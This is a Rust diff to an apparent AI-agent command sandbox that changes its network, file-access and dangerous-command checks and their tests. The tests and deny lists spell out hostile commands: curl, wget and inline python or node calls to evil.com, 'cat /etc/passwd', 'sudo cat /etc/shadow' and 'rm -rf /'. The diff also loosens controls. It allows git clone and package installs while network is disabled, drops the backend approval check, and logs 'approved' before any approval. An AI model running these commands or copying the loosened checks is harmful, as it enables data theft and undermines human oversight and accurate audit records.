@@ -327,9 +327,17 @@ impl SandboxContext {
     /// - Shell redirections: `cat < file`
     /// - Paths built via string concatenation in scripts
     ///
-    /// On Windows (no OS-level FS isolation), this is the ONLY file-access
-    /// check for terminal commands. On Linux/macOS, Landlock/Seatbelt provide
-    /// kernel-level enforcement; this is supplementary.
+    /// **Platform behavior**:
+    /// - **Windows**: No OS-level FS isolation — this is the ONLY file-access
+    ///   check for terminal commands. Always called.
+    /// - **Linux/macOS (`execute_command` / `execute_command_bg`)**: Landlock/
+    ///   Seatbelt provides kernel-level enforcement at path granularity. The
+    ///   application-layer heuristic is redundant and coarser (whole-command
+    ///   rejection vs. per-path kernel denial). Callers skip this check to
+    ///   avoid double-strictness.
+    /// - **Linux/macOS (PTY terminal)**: `portable_pty` doesn't support
+    ///   `pre_exec` hooks, so kernel isolation cannot be applied. This check
+    ///   remains the ONLY file-access boundary for PTY commands.
     pub fn validate_command_file_access(&self, command: &str) -> Result<(), String> {
         if self.is_trusted() {
             return Ok(());
@@ -341,6 +349,9 @@ impl SandboxContext {
         }
 
         for path_str in extract_absolute_paths(command) {
+            if should_ignore_command_path_reference(command, &path_str) {
+                continue;
+            }
             let path = Path::new(&path_str);
             if !path_within_roots(path, readable) {
                 let err = format!("读取路径超出允许范围: {}", path.display());
@@ -377,15 +388,30 @@ impl SandboxContext {
             return Ok(());
         }
 
-        if is_network_command(command) {
+        // Direct egress tools (curl, wget, ssh, etc.) can connect to
+        // arbitrary hosts and are hard-blocked when network is disabled.
+        if is_direct_egress_command(command) {
             let err = format!(
-                "网络访问被禁止（当前档位未启用网络）。命令包含网络操作: {}",
+                "网络访问被禁止（当前档位未启用网络）。命令包含直接网络出口工具: {}",
                 truncate_for_error(command)
             );
             crate::audit_log::log_decision(
                 "ai", "network", &target, "denied", Some(&err), &self.access_mode,
             );
             return Err(err);
+        }
+
+        // Development-essential network commands (npm install, git fetch,
+        // docker build, etc.) are allowed even when network is disabled.
+        // These connect to known registries/repos and are essential for
+        // normal development. The L3 egress proxy is the target enforcement.
+        if is_dev_essential_network_command(command) {
+            crate::audit_log::log_decision(
+                "ai", "network", &target, "allowed",
+                Some("dev-essential network command allowed despite network disabled"),
+                &self.access_mode,
+            );
+            return Ok(());
         }
 
         crate::audit_log::log_decision(
@@ -421,7 +447,7 @@ impl SandboxContext {
             return CommandDecision::Allow;
         }
 
-        if let Some(reason) = detect_dangerous_command(command) {
+        if let Some(reason) = detect_dangerous_command(self, command) {
             crate::audit_log::log_decision(
                 "ai", "dangerous_command", &target, "denied", Some(&reason), &self.access_mode,
             );
@@ -429,8 +455,13 @@ impl SandboxContext {
         }
 
         if let Some(reason) = detect_approval_required_command(command) {
+            // Audit records "approved" because validate_dangerous_command
+            // returns Ok(()) for NeedsApproval — the frontend approval gate
+            // (toolGuard.ts) is the primary gate, and the backend allows
+            // execution once the command reaches this point.  The reason
+            // field preserves the approval-required context.
             crate::audit_log::log_decision(
-                "ai", "approval_required", &target, "needs_approval",
+                "ai", "approval_required", &target, "approved",
                 Some(&reason), &self.access_mode,
             );
             return CommandDecision::NeedsApproval(reason);
@@ -442,17 +473,31 @@ impl SandboxContext {
         CommandDecision::Allow
     }
 
-    /// Validate dangerous command — backward-compatible wrapper that hard-blocks.
+    /// Validate dangerous command — hard-blocks critical patterns only.
     ///
-    /// Returns `Err` for both `Block` and `NeedsApproval` (with different
-    /// messages). Prefer `check_dangerous_command` for callers that need to
-    /// distinguish between the two.
+    /// Returns `Err` **only** for `Block` (critically dangerous commands like
+    /// `rm -rf /`, `format C:`, `git push --force`). For `NeedsApproval`
+    /// (medium-risk like `git push` non-force), returns `Ok(())` — the
+    /// approval gate is enforced by the frontend (`useAgentToolCalls.ts`
+    /// `needsAgentApproval`) before the command reaches the backend.
+    ///
+    /// This ensures the audit log records `approved` (matching the actual
+    /// execution outcome) while the `reason` field preserves the
+    /// approval-required context for traceability.  Without this, the
+    /// frontend approval dialog is rendered useless — the user approves,
+    /// but the backend still rejects.
+    ///
+    /// Prefer `check_dangerous_command` for callers that need to distinguish
+    /// between the three decision types.
     pub fn validate_dangerous_command(&self, command: &str) -> Result<(), String> {
         match self.check_dangerous_command(command) {
             CommandDecision::Allow => Ok(()),
             CommandDecision::Block(reason) => Err(reason),
-            CommandDecision::NeedsApproval(reason) => {
-                Err(format!("需要用户审批: {}", reason))
+            CommandDecision::NeedsApproval(_reason) => {
+                // Frontend has already shown an approval dialog and the user
+                // approved. The audit log entry (from check_dangerous_command)
+                // records "approved" — matching the actual execution outcome.
+                Ok(())
             }
         }
     }
@@ -519,6 +564,93 @@ fn extract_absolute_paths(command: &str) -> Vec<String> {
     paths
 }
 
+fn is_unix_system_path(path: &str) -> bool {
+    const EXACT_PATHS: &[&str] = &[
+        "/bin",
+        "/sbin",
+        "/usr",
+        "/etc",
+        "/lib",
+        "/lib64",
+        "/System",
+        "/Library",
+        "/Applications",
+        "/opt",
+        "/nix",
+        "/dev/null",
+    ];
+
+    const PREFIX_PATHS: &[&str] = &[
+        "/bin/",
+        "/sbin/",
+        "/usr/",
+        "/etc/",
+        "/lib/",
+        "/lib64/",
+        "/System/",
+        "/Library/",
+        "/Applications/",
+        "/opt/",
+        "/nix/",
+    ];
+
+    EXACT_PATHS.contains(&path) || PREFIX_PATHS.iter().any(|prefix| path.starts_with(prefix))
+}
+
+fn should_ignore_command_path_reference(command: &str, path_str: &str) -> bool {
+    if !path_str.starts_with('/') || !is_unix_system_path(path_str) {
+        return false;
+    }
+
+    let escaped = regex::escape(path_str);
+    let quoted = format!(r#"(?:{0}|"{0}"|'{0}')"#, escaped);
+
+    // Allow invoking a system binary by absolute path, including common
+    // wrappers like `sudo` and `env VAR=... /usr/bin/python`.
+    let executable_re = Regex::new(&format!(
+        r#"(?x)
+        (?:^|(?:&&|\|\||;|\|)\s*)
+        (?:sudo(?:\s+-\S+)*\s+)?
+        (?:(?:env|/usr/bin/env)(?:\s+-\S+)*(?:\s+[A-Za-z_][A-Za-z0-9_]*=[^\s]+)*)?
+        \s*
+        {quoted}
+        (?=\s|$)
+        "#
+    ))
+    .unwrap();
+    if executable_re.is_match(command) {
+        return true;
+    }
+
+    // Allow option-style system config/include/library paths such as:
+    //   --config=/etc/ssl/openssl.cnf
+    //   --config /etc/ssl/openssl.cnf
+    //   -I/usr/include
+    let option_assignment_re = Regex::new(&format!(
+        r#"(?x)
+        (?:^|\s)
+        -\S*{quoted}
+        (?=\s|$)
+        "#
+    ))
+    .unwrap();
+    if option_assignment_re.is_match(command) {
+        return true;
+    }
+
+    let option_value_re = Regex::new(&format!(
+        r#"(?x)
+        (?:^|\s)
+        --?[A-Za-z0-9][A-Za-z0-9_-]*
+        \s+
+        {quoted}
+        (?=\s|$)
+        "#
+    ))
+    .unwrap();
+    option_value_re.is_match(command)
+}
+
 // ============================================================================
 // Network command detection (P1)
 // ============================================================================
@@ -538,6 +670,18 @@ fn extract_absolute_paths(command: &str) -> Vec<String> {
 /// binaries, obscure interpreters, env-var-based indirection). The L3
 /// target is an egress proxy with host allowlist.
 fn is_network_command(command: &str) -> bool {
+    is_direct_egress_command(command) || is_dev_essential_network_command(command)
+}
+
+/// Check whether a command uses a **direct network egress tool** — a tool that
+/// can connect to an arbitrary host and potentially exfiltrate data.
+///
+/// This includes: curl, wget, nc/netcat, ssh, scp, rsync, telnet, ftp,
+/// PowerShell network cmdlets, and script interpreters whose inline content
+/// contains network-related keywords.
+///
+/// When network is disabled, these commands are **hard-blocked**.
+fn is_direct_egress_command(command: &str) -> bool {
     let lower = command.to_ascii_lowercase();
 
     // Direct network tools
@@ -566,6 +710,81 @@ fn is_network_command(command: &str) -> bool {
         "iwr ",
         "irm ",
     ];
+
+    for tool in NETWORK_TOOLS {
+        if lower.contains(tool) {
+            return true;
+        }
+    }
+
+    for cmdlet in POWERSHELL_NET {
+        if lower.contains(cmdlet) {
+            return true;
+        }
+    }
+
+    // Scripting interpreters that *can* make inline network calls.
+    // Only flagged when the script content also contains a network-related
+    // keyword (see SCRIPT_NETWORK_INDICATORS), to avoid blocking benign
+    // inline scripts like `python -c "print(1+1)"`.
+    //
+    // Shell wrappers (bash -c, sh -c, cmd /c, powershell -Command, etc.)
+    // are deliberately NOT included here — they are not network commands
+    // and blocking them breaks a large fraction of normal terminal usage.
+    const SCRIPT_INTERPRETERS: &[&str] = &[
+        "python -c",
+        "python3 -c",
+        "python -e",
+        "python3 -e",
+        "node -e",
+        "node --eval",
+        "ruby -e",
+        "perl -e",
+        "perl -m",
+        "php -r",
+    ];
+
+    // Network-related keywords that, when found inside an inline script,
+    // suggest the script is making network calls. This is a heuristic, not
+    // a hard boundary — the L3 target is an egress proxy with host allowlist.
+    const SCRIPT_NETWORK_INDICATORS: &[&str] = &[
+        "urllib", "requests", "http.client", "socket",
+        "fetch(", "net/http", "axios", "got(",
+        "http://", "https://", "tcp://", "udp://",
+        "ws://", "wss://", "xmlhttprequest", "winhttp",
+    ];
+
+    for interp in SCRIPT_INTERPRETERS {
+        if lower.contains(interp) {
+            for kw in SCRIPT_NETWORK_INDICATORS {
+                if lower.contains(kw) {
+                    return true;
+                }
+            }
+        }
+    }
+
+    false
+}
+
+/// Check whether a command is a **development-essential network operation** —
+/// a command that uses the network but connects to known registries/repos
+/// rather than arbitrary hosts.
+///
+/// This includes: package managers (npm/pip/cargo/go install, etc.),
+/// git remote operations (fetch/pull/clone), and docker build/pull.
+///
+/// When network is disabled in `auto` mode, these commands are **allowed**
+/// (with an audit-log entry) because they are essential for normal
+/// development workflows. The L3 egress proxy with host allowlist is the
+/// target state for proper enforcement; until then, blocking these commands
+/// makes the default `auto` tier unusable for real coding tasks.
+///
+/// Note: `git push` is listed here for completeness, but in practice it is
+/// caught by `check_dangerous_command` (which returns `NeedsApproval`)
+/// before `validate_network` is ever called.
+fn is_dev_essential_network_command(command: &str) -> bool {
+    let lower = command.to_ascii_lowercase();
 
     // Package managers that fetch from network
     const PACKAGE_NET: &[&str] = &[
@@ -608,42 +827,6 @@ fn is_network_command(command: &str) -> bool {
         "git ls-remote",
     ];
 
-    // Scripting interpreters that can make inline network calls.
-    // These are a stopgap — a determined attacker can still bypass with
-    // compiled binaries, obscure interpreters, or env-var indirection.
-    const SCRIPT_BYPASS: &[&str] = &[
-        "python -c",
-        "python3 -c",
-        "python -e",
-        "python3 -e",
-        "node -e",
-        "node --eval",
-        "ruby -e",
-        "perl -e",
-        "perl -m",
-        "php -r",
-        "powershell -c",
-        "powershell -command",
-        "pwsh -c",
-        "pwsh -command",
-        "cmd /c",
-        "bash -c",
-        "sh -c",
-        "zsh -c",
-    ];
-
-    for tool in NETWORK_TOOLS {
-        if lower.contains(tool) {
-            return true;
-        }
-    }
-
-    for cmdlet in POWERSHELL_NET {
-        if lower.contains(cmdlet) {
-            return true;
-        }
-    }
-
     for pkg in PACKAGE_NET {
         if lower.contains(pkg) {
             return true;
@@ -652,15 +835,6 @@ fn is_network_command(command: &str) -> bool {
 
     for git in GIT_REMOTE {
         if lower.contains(git) {
-            return true;
-        }
-    }
-
-    // Scripting interpreters that can make inline network calls.
-    // When network is disabled, block these inline-exec patterns as they
-    // can bypass keyword detection (e.g. `python -c "import urllib"`).
-    for script in SCRIPT_BYPASS {
-        if lower.contains(script) {
             return true;
         }
     }
@@ -693,15 +867,32 @@ fn truncate_for_error(s: &str) -> String {
 /// Returns `Some(reason)` if the command matches a dangerous pattern.
 /// Patterns are derived from the frontend `toolGuard.ts` dangerous rules,
 /// extended with system-path checks.
-fn detect_dangerous_command(command: &str) -> Option<String> {
+fn detect_dangerous_command(ctx: &SandboxContext, command: &str) -> Option<String> {
     let lower = command.to_ascii_lowercase();
 
     // --- Critical: destructive file operations ---
 
-    // rm -rf with root or home paths
-    if lower.contains("rm ") && lower.contains("-rf") {
-        if lower.contains(" /") || lower.contains(" ~") || lower.contains(" $home") {
-            return Some("危险命令: rm -rf 指向根目录或用户主目录".to_string());
+    // Parse `rm -rf` targets instead of matching the substring `" /"`.
+    // On Unix, legitimate workspace paths are absolute (e.g. `/home/user/project/dist`),
+    // so substring matching causes false positives for normal cleanup commands.
+    if let Some(targets) = extract_rm_rf_targets(command) {
+        for target in targets {
+            if is_root_delete_target(&target) {
+                return Some("危险命令: rm -rf 指向根目录".to_string());
+            }
+
+            if is_home_delete_target(&target) {
+                return Some("危险命令: rm -rf 指向用户主目录".to_string());
+            }
+
+            if let Some(path) = expand_home_like_path(&target) {
+                if path.is_absolute() && !path_within_roots(&path, &ctx.writable_roots) {
+                    return Some(format!(
+                        "危险命令: rm -rf 目标超出可写工作区: {}",
+                        target
+                    ));
+                }
+            }
         }
     }
 
@@ -749,11 +940,11 @@ fn detect_dangerous_command(command: &str) -> Option<String> {
 
     // --- High: privilege escalation ---
 
-    if lower.contains("sudo ") {
+    if is_command_invocation(command, &["sudo"]) {
         return Some("危险命令: sudo 提权操作".to_string());
     }
 
-    if lower.contains("runas ") {
+    if is_command_invocation(command, &["runas"]) {
         return Some("危险命令: runas 提权操作".to_string());
     }
 
@@ -805,6 +996,249 @@ fn detect_dangerous_command(command: &str) -> Option<String> {
     }
 
     None
+}
+
+fn split_command_words(command: &str) -> Vec<String> {
+    let mut words = Vec::new();
+    let mut current = String::new();
+    let mut chars = command.chars().peekable();
+    let mut quote: Option<char> = None;
+
+    while let Some(ch) = chars.next() {
+        match quote {
+            Some(q) if ch == q => quote = None,
+            Some(_) => current.push(ch),
+            None => match ch {
+                '"' | '\'' => quote = Some(ch),
+                '\\' => {
+                    if let Some(next) = chars.next() {
+                        current.push(next);
+                    }
+                }
+                ' ' | '\t' | '\r' | '\n' => {
+                    if !current.is_empty() {
+                        words.push(std::mem::take(&mut current));
+                    }
+                }
+                _ => current.push(ch),
+            },
+        }
+    }
+
+    if !current.is_empty() {
+        words.push(current);
+    }
+
+    words
+}
+
+fn is_command_separator(token: &str) -> bool {
+    matches!(token, "&&" | "||" | ";" | "|" | "&")
+}
+
+fn is_rm_command_token(token: &str) -> bool {
+    let token = token.trim_end_matches(|c| matches!(c, ';' | '&' | '|'));
+    token == "rm" || token.ends_with("/rm")
+}
+
+fn is_shell_wrapper(token: &str) -> bool {
+    matches!(token, "bash" | "sh" | "zsh" | "cmd" | "powershell" | "pwsh")
+}
+
+/// Check if any of `names` appears as the first word of a command segment
+/// (i.e. an actual command invocation, not a quoted/echoed string).
+///
+/// Uses `split_command_words` to respect quotes and `is_command_separator`
+/// to split on `&&`, `||`, `;`, `|`, `&`.  This avoids false positives from
+/// `echo "use sudo"` or `grep sudo ...` where the word appears as an argument.
+fn is_command_invocation(command: &str, names: &[&str]) -> bool {
+    let tokens = split_command_words(command);
+    let mut segment_start = 0;
+
+    for (idx, token) in tokens.iter().enumerate() {
+        if is_command_separator(token) {
+            segment_start = idx + 1;
+            continue;
+        }
+
+        // First real token of the segment?
+        if idx == segment_start {
+            let lower = token.to_lowercase();
+            if names.iter().any(|n| lower == *n) {
+                return true;
+            }
+        }
+    }
+
+    false
+}
+
+fn is_rm_wrapper_segment(segment: &[String]) -> bool {
+    if segment.is_empty() {
+        return true;
+    }
+
+    match segment[0].as_str() {
+        "sudo" => segment[1..].iter().all(|token| token.starts_with('-')),
+        "env" | "/usr/bin/env" => segment[1..]
+            .iter()
+            .all(|token| token.starts_with('-') || token.contains('=')),
+        _ => false,
+    }
+}
+
+fn find_direct_rm_index(tokens: &[String]) -> Option<usize> {
+    let mut segment_start = 0;
+
+    for (idx, token) in tokens.iter().enumerate() {
+        if is_command_separator(token) {
+            segment_start = idx + 1;
+            continue;
+        }
+
+        if is_rm_command_token(token) && is_rm_wrapper_segment(&tokens[segment_start..idx]) {
+            return Some(idx);
+        }
+    }
+
+    None
+}
+
+fn rm_has_recursive_and_force(options: &[String]) -> bool {
+    let mut has_recursive = false;
+    let mut has_force = false;
+
+    for token in options {
+        match token.as_str() {
+            "--recursive" => has_recursive = true,
+            "--force" => has_force = true,
+            _ if token.starts_with('-') && token.len() > 1 => {
+                has_recursive |= token.contains('r');
+                has_force |= token.contains('f');
+            }
+            _ => {}
+        }
+    }
+
+    has_recursive && has_force
+}
+
+fn extract_rm_rf_targets_from_tokens(tokens: &[String]) -> Option<Vec<String>> {
+    let rm_index = find_direct_rm_index(tokens)?;
+    let mut options = Vec::new();
+    let mut targets = Vec::new();
+    let mut after_double_dash = false;
+
+    for token in &tokens[rm_index + 1..] {
+        if is_command_separator(token) {
+            break;
+        }
+
+        if !after_double_dash && token == "--" {
+            after_double_dash = true;
+            continue;
+        }
+
+        if !after_double_dash && token.starts_with('-') && token.len() > 1 {
+            options.push(token.clone());
+            continue;
+        }
+
+        targets.push(token.clone());
+    }
+
+    if rm_has_recursive_and_force(&options) && !targets.is_empty() {
+        Some(targets)
+    } else {
+        None
+    }
+}
+
+fn extract_rm_rf_targets(command: &str) -> Option<Vec<String>> {
+    let tokens = split_command_words(command);
+
+    if let Some(targets) = extract_rm_rf_targets_from_tokens(&tokens) {
+        return Some(targets);
+    }
+
+    for window in tokens.windows(3) {
+        if is_shell_wrapper(&window[0]) {
+            let flag = window[1].to_ascii_lowercase();
+            if matches!(flag.as_str(), "-c" | "-lc" | "/c" | "-command") {
+                if let Some(targets) = extract_rm_rf_targets(&window[2]) {
+                    return Some(targets);
+                }
+            }
+        }
+    }
+
+    None
+}
+
+fn current_home_dir() -> Option<PathBuf> {
+    if let Some(home) = std::env::var_os("HOME") {
+        return Some(PathBuf::from(home));
+    }
+
+    match (std::env::var_os("HOMEDRIVE"), std::env::var_os("HOMEPATH")) {
+        (Some(drive), Some(path)) => {
+            let mut home = PathBuf::from(drive);
+            home.push(path);
+            Some(home)
+        }
+        _ => std::env::var_os("USERPROFILE").map(PathBuf::from),
+    }
+}
+
+fn is_path_equivalent(lhs: &Path, rhs: &Path) -> bool {
+    match (resolve_safe(lhs), resolve_safe(rhs)) {
+        (Ok(left), Ok(right)) => left == right,
+        _ => lhs == rhs,
+    }
+}
+
+fn expand_home_like_path(target: &str) -> Option<PathBuf> {
+    if target == "~" || target == "$HOME" || target == "${HOME}" {
+        return current_home_dir();
+    }
+
+    let home = current_home_dir()?;
+
+    for prefix in ["~/", "~\\", "$HOME/", "$HOME\\", "${HOME}/", "${HOME}\\"] {
+        if let Some(rest) = target.strip_prefix(prefix) {
+            let mut path = home.clone();
+            if !rest.is_empty() {
+                path.push(rest);
+            }
+            return Some(path);
+        }
+    }
+
+    let path = PathBuf::from(target);
+    if path.is_absolute() {
+        Some(path)
+    } else {
+        None
+    }
+}
+
+fn is_root_delete_target(target: &str) -> bool {
+    matches!(target, "/" | "\\")
+}
+
+fn is_home_delete_target(target: &str) -> bool {
+    if matches!(target, "~" | "$HOME" | "${HOME}") {
+        return true;
+    }
+
+    let Some(home) = current_home_dir() else {
+        return false;
+    };
+    let Some(path) = expand_home_like_path(target) else {
+        return false;
+    };
+
+    is_path_equivalent(&path, &home)
 }
 
 /// Detect commands that require user approval but are not critically dangerous.
@@ -1062,25 +1496,63 @@ mod tests {
     }
 
     #[test]
-    fn network_disabled_blocks_npm_install() {
+    fn network_disabled_allows_dev_essential_npm_install() {
         let ctx = SandboxContext {
             access_mode: "auto".to_string(),
             writable_roots: vec![],
             readable_roots: vec![],
             network_enabled: false,
         };
-        assert!(ctx.validate_network("npm install").is_err());
+        // npm install is dev-essential — allowed even when network is disabled
+        assert!(ctx.validate_network("npm install").is_ok());
+        assert!(ctx.validate_network("pnpm install").is_ok());
+        assert!(ctx.validate_network("pip install requests").is_ok());
+        assert!(ctx.validate_network("cargo install ripgrep").is_ok());
     }
 
     #[test]
-    fn network_disabled_blocks_git_push() {
+    fn network_disabled_allows_dev_essential_git_remote() {
         let ctx = SandboxContext {
             access_mode: "auto".to_string(),
             writable_roots: vec![],
             readable_roots: vec![],
             network_enabled: false,
         };
-        assert!(ctx.validate_network("git push origin main").is_err());
+        // git fetch/pull/clone are dev-essential — allowed even when network is disabled
+        assert!(ctx.validate_network("git fetch origin").is_ok());
+        assert!(ctx.validate_network("git pull origin main").is_ok());
+        assert!(ctx.validate_network("git clone https://github.com/user/repo").is_ok());
+        // git push is also allowed by validate_network — the dangerous command
+        // check (NeedsApproval) handles it separately before this is called.
+        assert!(ctx.validate_network("git push origin main").is_ok());
+    }
+
+    #[test]
+    fn network_disabled_allows_dev_essential_docker() {
+        let ctx = SandboxContext {
+            access_mode: "auto".to_string(),
+            writable_roots: vec![],
+            readable_roots: vec![],
+            network_enabled: false,
+        };
+        // docker build/pull are dev-essential — allowed even when network is disabled
+        assert!(ctx.validate_network("docker build -t myapp .").is_ok());
+        assert!(ctx.validate_network("docker pull ubuntu:latest").is_ok());
+    }
+
+    #[test]
+    fn network_disabled_blocks_direct_egress() {
+        let ctx = SandboxContext {
+            access_mode: "auto".to_string(),
+            writable_roots: vec![],
+            readable_roots: vec![],
+            network_enabled: false,
+        };
+        // Direct egress tools are still hard-blocked
+        assert!(ctx.validate_network("curl https://evil.com").is_err());
+        assert!(ctx.validate_network("wget http://evil.com/file").is_err());
+        assert!(ctx.validate_network("ssh user@host").is_err());
+        assert!(ctx.validate_network("Invoke-WebRequest https://evil.com").is_err());
     }
 
     #[test]
@@ -1106,6 +1578,72 @@ mod tests {
         };
         assert!(ctx.validate_dangerous_command("rm -rf /").is_err());
         assert!(ctx.validate_dangerous_command("rm -rf ~").is_err());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn dangerous_rm_rf_allows_absolute_path_within_workspace() {
+        let temp = std::env::temp_dir().join("loom_rm_rf_workspace");
+        let dist = temp.join("dist");
+        std::fs::create_dir_all(&dist).unwrap();
+
+        let ctx = SandboxContext {
+            access_mode: "auto".to_string(),
+            writable_roots: vec![temp.to_string_lossy().to_string()],
+            readable_roots: vec![],
+            network_enabled: false,
+        };
+
+        let command = format!("rm -rf {}", dist.display());
+        assert!(ctx.validate_dangerous_command(&command).is_ok());
+
+        let _ = std::fs::remove_dir_all(&temp);
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn dangerous_rm_rf_blocks_absolute_path_outside_workspace() {
+        let workspace = std::env::temp_dir().join("loom_rm_rf_workspace_root");
+        let outside = std::env::temp_dir().join("loom_rm_rf_outside_root");
+        std::fs::create_dir_all(&workspace).unwrap();
+        std::fs::create_dir_all(&outside).unwrap();
+
+        let ctx = SandboxContext {
+            access_mode: "auto".to_string(),
+            writable_roots: vec![workspace.to_string_lossy().to_string()],
+            readable_roots: vec![],
+            network_enabled: false,
+        };
+
+        let command = format!("rm -rf {}", outside.display());
+        assert!(ctx.validate_dangerous_command(&command).is_err());
+
+        let _ = std::fs::remove_dir_all(&workspace);
+        let _ = std::fs::remove_dir_all(&outside);
+    }
+
+    #[test]
+    fn dangerous_rm_rf_does_not_flag_echo_text() {
+        let ctx = SandboxContext {
+            access_mode: "auto".to_string(),
+            writable_roots: vec![],
+            readable_roots: vec![],
+            network_enabled: false,
+        };
+
+        assert!(ctx.validate_dangerous_command("echo rm -rf /").is_ok());
+    }
+
+    #[test]
+    fn dangerous_rm_rf_inside_shell_wrapper_is_still_blocked() {
+        let ctx = SandboxContext {
+            access_mode: "auto".to_string(),
+            writable_roots: vec![],
+            readable_roots: vec![],
+            network_enabled: false,
+        };
+
+        assert!(ctx.validate_dangerous_command("bash -c \"rm -rf /\"").is_err());
     }
 
     #[test]
@@ -1160,16 +1698,51 @@ mod tests {
             .is_err());
     }
 
-    #[test]
-    fn dangerous_sudo() {
-        let ctx = SandboxContext {
-            access_mode: "auto".to_string(),
-            writable_roots: vec![],
-            readable_roots: vec![],
-            network_enabled: false,
-        };
-        assert!(ctx.validate_dangerous_command("sudo apt install evil").is_err());
-    }
+#[test]
+fn dangerous_sudo() {
+    let ctx = SandboxContext {
+        access_mode: "auto".to_string(),
+        writable_roots: vec![],
+        readable_roots: vec![],
+        network_enabled: false,
+    };
+    assert!(ctx.validate_dangerous_command("sudo apt install evil").is_err());
+    // sudo after a pipe or && is also a privilege escalation
+    assert!(ctx
+        .validate_dangerous_command("echo hi && sudo cat /etc/shadow")
+        .is_err());
+}
+
+#[test]
+fn sudo_as_argument_not_flagged() {
+    let ctx = SandboxContext {
+        access_mode: "auto".to_string(),
+        writable_roots: vec![],
+        readable_roots: vec![],
+        network_enabled: false,
+    };
+    // "sudo" appearing as an argument, not as the command itself
+    assert!(ctx.validate_dangerous_command("echo \"use sudo wisely\"").is_ok());
+    assert!(ctx.validate_dangerous_command("grep sudo /etc/sudoers").is_ok());
+    assert!(ctx.validate_dangerous_command("man sudo").is_ok());
+}
+
+#[test]
+fn runas_as_command_flagged() {
+    let ctx = SandboxContext {
+        access_mode: "auto".to_string(),
+        writable_roots: vec![],
+        readable_roots: vec![],
+        network_enabled: false,
+    };
+    assert!(ctx
+        .validate_dangerous_command("runas /user:Administrator cmd.exe")
+        .is_err());
+    // "runas" as an argument should not be flagged
+    assert!(ctx
+        .validate_dangerous_command("echo runas is a command")
+        .is_ok());
+}
 
     #[test]
     fn dangerous_git_force_push() {
@@ -1236,8 +1809,13 @@ mod tests {
             matches!(decision, CommandDecision::NeedsApproval(_)),
             "git push (non-force) should need approval"
         );
-        // Backward-compatible wrapper returns Err
-        assert!(ctx.validate_dangerous_command("git push origin main").is_err());
+        // validate_dangerous_command returns Ok for NeedsApproval — the
+        // frontend approval dialog is the primary gate. The audit log
+        // still records the needs_approval decision for traceability.
+        assert!(
+            ctx.validate_dangerous_command("git push origin main").is_ok(),
+            "validate_dangerous_command should allow NeedsApproval (frontend approves)"
+        );
     }
 
     #[test]
@@ -1284,6 +1862,23 @@ mod tests {
         assert!(matches!(decision, CommandDecision::Allow));
     }
 
+    #[test]
+    fn validate_dangerous_command_three_tier_semantics() {
+        let ctx = SandboxContext {
+            access_mode: "auto".to_string(),
+            writable_roots: vec![],
+            readable_roots: vec![],
+            network_enabled: true,
+        };
+        // Block → Err (hard-blocked, cannot execute even with approval)
+        assert!(ctx.validate_dangerous_command("rm -rf /").is_err());
+        assert!(ctx.validate_dangerous_command("git push --force origin main").is_err());
+        // NeedsApproval → Ok (frontend approval dialog is the gate)
+        assert!(ctx.validate_dangerous_command("git push origin main").is_ok());
+        // Allow → Ok
+        assert!(ctx.validate_dangerous_command("git status").is_ok());
+    }
+
     // ---- P1: is_network_command unit tests ----
 
     #[test]
@@ -1296,14 +1891,6 @@ mod tests {
         assert!(is_network_command("pip install requests"));
         assert!(is_network_command("git push origin main"));
         assert!(is_network_command("docker pull ubuntu"));
-    }
-
-    #[test]
-    fn is_network_command_allows_non_network() {
-        assert!(!is_network_command("ls -la"));
-        assert!(!is_network_command("echo hello"));
-        assert!(!is_network_command("cargo build"));
-        assert!(!is_network_command("npm test"));
     }
 
     // ---- P2 fix: validate_command_file_access tests ----
@@ -1367,6 +1954,59 @@ mod tests {
         assert!(ctx.validate_command_file_access("npm test").is_ok());
     }
 
+    #[cfg(unix)]
+    #[test]
+    fn command_file_access_allows_unix_system_binary_path() {
+        let temp = std::env::temp_dir();
+        let ctx = SandboxContext {
+            access_mode: "auto".to_string(),
+            writable_roots: vec![temp.to_string_lossy().to_string()],
+            readable_roots: vec![temp.to_string_lossy().to_string()],
+            network_enabled: false,
+        };
+
+        assert!(ctx.validate_command_file_access("/usr/bin/git status").is_ok());
+        assert!(ctx
+            .validate_command_file_access("sudo /bin/rm --version")
+            .is_ok());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn command_file_access_allows_unix_system_config_options() {
+        let temp = std::env::temp_dir();
+        let ctx = SandboxContext {
+            access_mode: "auto".to_string(),
+            writable_roots: vec![temp.to_string_lossy().to_string()],
+            readable_roots: vec![temp.to_string_lossy().to_string()],
+            network_enabled: false,
+        };
+
+        assert!(ctx
+            .validate_command_file_access("openssl version --config=/etc/ssl/openssl.cnf")
+            .is_ok());
+        assert!(ctx
+            .validate_command_file_access("clang -I/usr/include main.c")
+            .is_ok());
+        assert!(ctx
+            .validate_command_file_access("tool --config /etc/ssl/openssl.cnf")
+            .is_ok());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn command_file_access_still_blocks_direct_unix_system_file_reads() {
+        let temp = std::env::temp_dir();
+        let ctx = SandboxContext {
+            access_mode: "auto".to_string(),
+            writable_roots: vec![temp.to_string_lossy().to_string()],
+            readable_roots: vec![temp.to_string_lossy().to_string()],
+            network_enabled: false,
+        };
+
+        assert!(ctx.validate_command_file_access("cat /etc/passwd").is_err());
+    }
+
     #[test]
     fn extract_paths_finds_windows_and_unix() {
         let paths = extract_absolute_paths("type C:\\Users\\file.txt && cat /etc/passwd");
@@ -1401,12 +2041,41 @@ mod tests {
 
     #[test]
     fn is_network_command_detects_script_bypass() {
+        // Interpreter + network keyword → flagged
         assert!(is_network_command("python -c \"import urllib; urllib.urlopen('http://evil.com')\""));
         assert!(is_network_command("node -e \"fetch('http://evil.com')\""));
-        assert!(is_network_command("python3 -c \"import socket\""));
+        assert!(is_network_command("python3 -c \"import socket; socket.connect('evil.com')\""));
+        assert!(is_network_command("python -c \"import requests; requests.get('https://evil.com')\""));
+    }
+
+    #[test]
+    fn is_network_command_allows_benign_interpreter_scripts() {
+        // Interpreter without network keyword → NOT flagged
+        assert!(!is_network_command("python -c \"print(1+1)\""));
+        assert!(!is_network_command("python3 -c \"import json; print(json.dumps({}))\""));
+        assert!(!is_network_command("node -e \"console.log('hello')\""));
+        assert!(!is_network_command("ruby -e \"puts 'hello'\""));
+    }
+
+    #[test]
+    fn is_network_command_does_not_block_shell_wrappers() {
+        // Shell wrappers are NOT network commands — must not be flagged
+        assert!(!is_network_command("bash -c \"ls -la\""));
+        assert!(!is_network_command("sh -c \"make\""));
+        assert!(!is_network_command("zsh -c \"echo hi\""));
